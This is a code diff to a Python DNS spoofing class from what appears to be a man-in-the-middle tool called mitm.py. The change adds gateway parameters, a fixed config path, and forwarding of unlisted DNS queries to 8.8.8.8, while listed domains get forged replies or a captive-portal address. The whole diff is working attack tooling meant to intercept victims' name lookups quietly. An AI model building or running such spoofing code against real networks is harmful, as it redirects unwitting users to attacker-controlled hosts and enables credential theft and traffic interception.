@@ -15,7 +15,7 @@ green   = Fore.GREEN
 magenta = Fore.MAGENTA
 
 class DNSSpoof(object):
-    def __init__(self,verbose=False,targets="",captive=""):
+    def __init__(self,verbose=False,targets="",captive="",gateway="",gateway_mac=""):
         self.main_thread = None
         self.interface   = "eth0"
         self.iface_info  = netifaces.ifaddresses(self.interface)
@@ -23,6 +23,10 @@ class DNSSpoof(object):
         self.local_mac   = self.iface_info[netifaces.AF_LINK][0]['addr']
         self.targets	 = list(targets.split("/"))
         self.captive     = captive
+        self.gateway     = gateway
+        self.gateway_mac = gateway_mac
+
+        print(self.gateway_mac)
 
         init()
         logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
@@ -33,7 +37,7 @@ class DNSSpoof(object):
         logging.debug(f"DNS: Local IP - {self.local_ip}, Local MAC - {self.local_mac}")
 
     def config(self):
-        conf  = json.loads(open("config/hosts.json","r").read())
+        conf  = json.loads(open("/usr/share/mitm.py/config/hosts.json","r").read())
         return conf
 
     def make_reply(self,pkt,redirect):
@@ -59,6 +63,11 @@ class DNSSpoof(object):
                     conf = self.config()
                     if pkt[DNSQR].qname.decode() in list(conf.keys()):
                         Thread(target=self.make_reply,args=(pkt, conf[pkt[DNSQR].qname.decode()] )).start()
+                    else:
+                        pkt[IP].dst = "8.8.8.8"
+                        # pkt[Ether].dst = self.gateway_mac
+                        send(pkt,verbose=0)
+                        logging.debug(f"DNS: Domain not in list redirected to gateway {pkt[IP].src} -> {pkt[IP].dst}")
                 else:
                     Thread(target=self.make_reply,args=(pkt, self.captive)).start()
 
